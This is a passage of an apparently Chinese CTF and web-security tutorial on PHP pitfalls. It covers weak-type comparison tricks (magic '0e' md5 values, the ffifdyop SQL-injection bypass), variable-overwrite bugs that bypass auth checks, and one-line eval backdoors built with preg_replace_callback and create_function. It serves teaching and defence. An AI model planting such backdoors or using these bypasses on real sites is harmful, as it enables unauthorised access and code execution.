+</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">fgets</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span><span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err">//逐字符地读取文件
+</span></span></span><span class="line"><span class="cl"><span class="err">$file=fopen(&#34;flag.txt&#34;,&#34;r&#34;) or exit(&#34;无法打开文件!&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">while (!feof($file))
+</span></span></span><span class="line"><span class="cl"><span class="err">{
+</span></span></span><span class="line"><span class="cl"><span class="err">    echo fgetc($file);
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">fclose($file);
+</span></span></span><span class="line"><span class="cl"><span class="err">?&gt; 
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取文件目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nx">scandir</span><span class="p">(</span><span class="s2">&#34;./&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">print_r</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取文件内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">file</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">print_r</span><span class="p">(</span><span class="nx">file</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">);</span> <span class="c1">//需要echo打印出来
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><br/>
+<h2 id="常见函数" class="headerLink">
+    <a href="#%e5%b8%b8%e8%a7%81%e5%87%bd%e6%95%b0" class="header-mark"></a>常见函数</h2><h3 id="strcmp-和-strcasecmp" class="headerLink">
+    <a href="#strcmp-%e5%92%8c-strcasecmp" class="header-mark"></a>strcmp 和 strcasecmp</h3><p>strcmp 和 strcasecmp（不区分大小写） 用于比较字符串，返回值如下：</p>
+<ul>
+<li>如果 str1 小于 str2 返回 &lt; 0；</li>
+<li>如果 str1 大于 str2 返回 &gt; 0；</li>
+<li>如果两者相等，返回 0。</li>
+</ul>
+<p>5.2 中是将两个参数先转换成string类型。
+5.3.3 以后，当比较数组和字符串的时候，返回是0。
+5.5 中如果参数不是string类型，直接return了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$array</span><span class="o">=</span><span class="p">[];</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//数组跟字符串比较会返回0,也就是判断为相等,输出null
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">strcmp</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span> <span class="s1">&#39;abc&#39;</span><span class="p">));</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">strcasecmp</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span> <span class="s1">&#39;abc&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="md5" class="headerLink">
+    <a href="#md5" class="header-mark"></a>md5</h3><p>md5(string, raw) raw为可选，规定十六进制或二进制输出格式</p>
+<ul>
+<li>TRUE - 原始 16 字节格式</li>
+<li>FALSE - 默认，32 字符十六进制数</li>
+</ul>
+<p>md5函数不能处理数组，如果传入数组会返回null，所以两个数组经过md5处理后的结果均相等，都为null</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// ?a[]=1&amp;b[]=2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span><span class="o">!==</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span><span class="o">===</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;success!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>md5函数弱类型比较，当用0e开头的字符会表示成科学计数法，0的多少次方结果均为0，从而让绕过md5函数弱比较
+开头为0e的值：</p>
+<ul>
+<li><code>QNKCDZO</code>  对应md5值 0e830400451993494058024219903391</li>
+<li><code>s878926199a</code> 对应md5值 0e545993274517709034328855841020</li>
+<li><code>s1091221200a</code> 对应md5值：0e940624217856561557816327384675</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//?a=QNKCDZO&amp;b=s878926199a
+</span></span></span><span class="line"><span class="cl"><span class="c1">//?a[]=1&amp;b[]=2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span><span class="o">!=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span><span class="o">==</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;success!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>ffifdyop绕过
+当源码sql语句为<code>$sql = &quot;SELECT * FROM admin WHERE pass = '&quot;.md5($password,true).&quot;'&quot;;</code>，可以用ffifdyop绕过
+原理：
+ffifdyop字符串经过md5加密后再转成字符为 <code>'or'66�]��!r,��b</code>，带入sql语句变成
+<code>select * from admin where password=''or'&lt;乱码&gt;' </code> 相当于<code>select * from admin where password=''or 1 </code></p>
+<h3 id="intval" class="headerLink">
+    <a href="#intval" class="header-mark"></a>intval</h3><p>intval()转换的时候，会将从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，intval()不会报错而是返回0。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">))</span> <span class="c1">// 2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="s1">&#39;3abcd&#39;</span><span class="p">))</span> <span class="c1">// 3
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="s1">&#39;abcd&#39;</span><span class="p">))</span> <span class="c1">// 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="mi">0</span> <span class="o">==</span> <span class="s1">&#39;0&#39;</span><span class="p">);</span> <span class="c1">// true
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="mi">0</span> <span class="o">==</span> <span class="s1">&#39;abcdefg&#39;</span><span class="p">);</span> <span class="c1">// true 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="mi">0</span> <span class="o">===</span> <span class="s1">&#39;abcdefg&#39;</span><span class="p">);</span> <span class="c1">// false
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="mi">1</span> <span class="o">==</span> <span class="s1">&#39;1abcdef&#39;</span><span class="p">);</span> <span class="c1">// true
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="is_numeric" class="headerLink">
+    <a href="#is_numeric" class="header-mark"></a>is_numeric</h3><p>is_numeric函数判断变量是否为数字或数字字符串，不仅检查十进制，十六进制是可以</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="mi">233333</span><span class="p">);</span>       <span class="c1">// 1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="s1">&#39;233333&#39;</span><span class="p">);</span>    <span class="c1">// 1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="mh">0x233333</span><span class="p">);</span>    <span class="c1">// 1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="s1">&#39;0x233333&#39;</span><span class="p">);</span>    <span class="c1">// 1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="s1">&#39;9e9&#39;</span><span class="p">);</span>   <span class="c1">// 1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="s1">&#39;233333abc&#39;</span><span class="p">);</span>  <span class="c1">// 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="in_array" class="headerLink">
+    <a href="#in_array" class="header-mark"></a>in_array</h3><p>在所有php认为是int的地方输入string，都会被强制转换</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$array</span><span class="o">=</span><span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">];</span>  
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="s1">&#39;abc&#39;</span><span class="p">,</span> <span class="nv">$array</span><span class="p">));</span> <span class="c1">//true   abc被转化成0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="s1">&#39;1bc&#39;</span><span class="p">,</span> <span class="nv">$array</span><span class="p">));</span> <span class="c1">//true   1bc被转化成1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><br/>
+<h3 id="变量覆盖" class="headerLink">
+    <a href="#%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96" class="header-mark"></a>变量覆盖</h3><p>将我们自定义的参数值替换原来程序的参数值的情况称作为变量覆盖，变量覆盖主要是函数使用不当如<code>extract</code>、<code>parse_str</code>、<code>import_request_variables</code>或者开启了全局变量注册、<code>$$</code>等。</p>
+<h4 id="extract" class="headerLink">
+    <a href="#extract" class="header-mark"></a>extract</h4><p>PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="c1">//?auth=1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$auth</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>  <span class="c1">//这里可以覆盖$auth的变量值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$auth</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;private!&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span><span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;public!&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="parse_str" class="headerLink">
+    <a href="#parse_str" class="header-mark"></a>parse_str</h4><p>parse_str的作用是解析字符串并注册成变量，如果参数str是URL传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//?auth=1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$auth</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">parse_str</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">]);</span>  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">echo</span> <span class="s2">&#34;true&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="import_request_variables" class="headerLink">
+    <a href="#import_request_variables" class="header-mark"></a>import_request_variables</h4><p>import_request_variables 函数可以在register_global =off时，把GET/POST/Cookie变量导入全局作用域中。
+注意：该函数从PHP5.4起已经被移除。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//?auth=1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$auth</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="nx">import_request_variables</span><span class="p">(</span><span class="s1">&#39;G&#39;</span><span class="p">);</span> <span class="c1">//参数G 表示指定导入GET请求中的变量，从而导致变量覆盖。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nv">$auth</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;private!&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;public!&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="变量覆盖-1" class="headerLink">
+    <a href="#%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96-1" class="header-mark"></a>$$变量覆盖</h4><p><code>$$</code>变量覆盖，利用foreach初始化遍历变量，将获取到的数组键名作为变量，数组中的键值作为变量的值，可能会导致变量覆盖</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="c1">//?auth=1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="nv">$auth</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">echo</span> <span class="s1">&#39;key= &#39;</span><span class="o">.</span><span class="nv">$key</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="s1">&#39;value= &#39;</span><span class="o">.</span><span class="nv">$value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$$key</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">echo</span> <span class="s2">&#34;&lt;br/&gt;&#34;</span><span class="o">.</span><span class="s2">&#34;true&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="全局变量覆盖" class="headerLink">
+    <a href="#%e5%85%a8%e5%b1%80%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96" class="header-mark"></a>全局变量覆盖</h4><p>在PHP版本小于5.4且PHP配置register_globals=ON时。可能会出现该漏洞，如果前面已经给$auth赋值则无法触发该漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//?auth=1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;Register_globals: &#34;</span><span class="o">.</span><span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nx">ini_get</span><span class="p">(</span><span class="s2">&#34;register_globals&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;&lt;br/&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">   <span class="k">echo</span> <span class="s2">&#34;private!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><br/>
+<h2 id="版本区别" class="headerLink">
+    <a href="#%e7%89%88%e6%9c%ac%e5%8c%ba%e5%88%ab" class="header-mark"></a>版本区别</h2><p>PHP5和PHP7的安全方面上的区别，大部分内容为<a href="https://www.cnblogs.com/r00tuser/p/10528864.html" target="_blank" rel="noopener noreffer">转载</a></p>
+<h4 id="preg_replace不再支持e修饰符" class="headerLink">
+    <a href="#preg_replace%e4%b8%8d%e5%86%8d%e6%94%af%e6%8c%81e%e4%bf%ae%e9%a5%b0%e7%ac%a6" class="header-mark"></a>preg_replace()不再支持/e修饰符</h4><p>在PHP5，该函数/e修饰符可以导致代码执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/.*/e&#34;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;h&#34;</span><span class="p">],</span><span class="s2">&#34;.&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>虽然现在PHP7以上不再支持/e修饰符，但是官方给了一个新的函数preg_replace_callback，稍微修一下就可以利用它做后门</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">preg_replace_callback</span><span class="p">(</span><span class="s2">&#34;/.*/&#34;</span><span class="p">,</span><span class="k">function</span> <span class="p">(</span><span class="nv">$a</span><span class="p">){</span><span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="mi">0</span><span class="p">]);},</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;h&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="create_function被废弃" class="headerLink">
+    <a href="#create_function%e8%a2%ab%e5%ba%9f%e5%bc%83" class="header-mark"></a>create_function被废弃</h4><p>create_function函数可以导致代码执行，虽说被弃用了，但是仍然可以用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$func</span> <span class="o">=</span><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span><span class="nv">$func</span><span class="p">();</span>
